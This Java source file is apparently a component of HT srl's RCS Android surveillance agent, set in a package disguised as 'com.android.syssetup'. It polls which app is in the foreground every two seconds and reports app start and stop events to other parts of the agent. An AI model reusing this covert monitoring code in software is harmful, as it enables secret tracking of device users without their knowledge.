/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ListenerProcess.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.syssetup.listener;

import com.android.syssetup.ProcessInfo;
import com.android.syssetup.ProcessStatus;
import com.android.syssetup.Standby;
import com.android.syssetup.Status;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.interfaces.Observer;
import com.android.syssetup.util.Check;
import com.android.syssetup.util.StringUtils;

import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

public class ListenerProcess extends Listener<ProcessInfo> implements Observer<Standby> {
	/**
	 * The Constant TAG.
	 */
	private static final String TAG = "ListenerProcess"; //$NON-NLS-1$
	private static final long PERIOD = 2000;
	/**
	 * The singleton.
	 */
	private volatile static ListenerProcess singleton;
	String lastForeground = "";
	BroadcastMonitorProcess bmp = new BroadcastMonitorProcess();
	private boolean started;
	private Object standbyLock = new Object();
	private Object startedLock = new Object();
	private ScheduledFuture<?> future;
	private ScheduledExecutorService stpe = Status.getStpe();

	public ListenerProcess() {
		super();

		synchronized (standbyLock) {
			ListenerStandby.self().attach(this);
			setSuspended(!ListenerStandby.isScreenOn());
		}
	}

	/**
	 * Self.
	 *
	 * @return the status
	 */
	public static ListenerProcess self() {
		if (singleton == null) {
			synchronized (ListenerProcess.class) {
				if (singleton == null) {
					singleton = new ListenerProcess();
				}
			}
		}

		return singleton;
	}

	@Override
	protected void start() {

		synchronized (startedLock) {
			if (!started) {
				if (ListenerStandby.isScreenOn()) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (start)");
					}

					started = true;
					this.future = stpe.scheduleAtFixedRate(bmp, this.PERIOD, this.PERIOD, TimeUnit.MILLISECONDS);

				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (start): screen off");
						setSuspended(true);
					}
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (start): already started");
				}
			}
		}

	}

	@Override
	protected void stop() {
		synchronized (startedLock) {
			if (started) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stop)");
				}

				started = false;

				if (this.future != null) {
					//dispatch(new ProcessInfo("", ProcessStatus.STOP));
					this.future.cancel(true);
					this.future = null;
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stop): already stopped");
				}
			}
		}

	}

	public synchronized boolean isRunning(String appName) {
		return lastForeground.equals(appName);
	}

	protected synchronized int dispatch(String currentForeground) {

		if (!currentForeground.equals(lastForeground)) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): started " + currentForeground);
				Check.log(TAG + " (notification): lastForeground " + lastForeground);
			}
			dispatch(new ProcessInfo(currentForeground, ProcessStatus.START));

			if (!StringUtils.isEmpty(lastForeground)) {
				super.dispatch(new ProcessInfo(lastForeground, ProcessStatus.STOP));
			}

			lastForeground = currentForeground;
		}

		return 0;
	}

	@Override
	public int notification(Standby b) {

		synchronized (standbyLock) {
			if (b.getStatus()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification): try to resume");
				}

				resume();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification): try to suspend");
				}

				suspend();
			}
		}

		return 0;
	}


	class BroadcastMonitorProcess implements Runnable {

		/**
		 * The Constant TAG.
		 */
		private static final String TAG = "BroadcastMonitorProcess"; //$NON-NLS-1$

		@Override
		public void run() {

			String foreground = Status.self().getForeground();
			if (Cfg.DEBUG) {
				//Check.log(TAG + " (run) " + foreground);
			}
			dispatch(foreground);
		}

	}

	;

}
